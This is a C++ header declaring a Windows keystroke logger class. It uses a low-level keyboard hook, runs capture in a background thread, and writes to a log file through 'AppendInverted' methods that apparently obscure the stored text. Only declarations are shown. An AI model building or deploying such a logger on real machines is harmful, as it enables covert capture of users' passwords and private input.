#ifndef KEYSTROKE_LOGGER_H
#define KEYSTROKE_LOGGER_H

#include <windows.h>
#include <string>
#include <thread> // Required for background execution

class KeystrokeLogger {
public:
    KeystrokeLogger(const std::string& filename);
    ~KeystrokeLogger();

    // Now runs in a separate thread so it doesn't block
    void StartAsync();
    void Stop();
    void Reset();

private:
    std::string logFilePath;
    HHOOK hHook;
    std::thread workerThread; // Thread handle
    static KeystrokeLogger* instance;

    static LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
    void AppendInverted(DWORD vkCode);

    // The actual blocking loop that will run inside the thread
    void RunLoop();
    void ProcessKeystroke(DWORD vkCode, DWORD scanCode);
    void AppendInverted(const std::string& text);
};

#endif

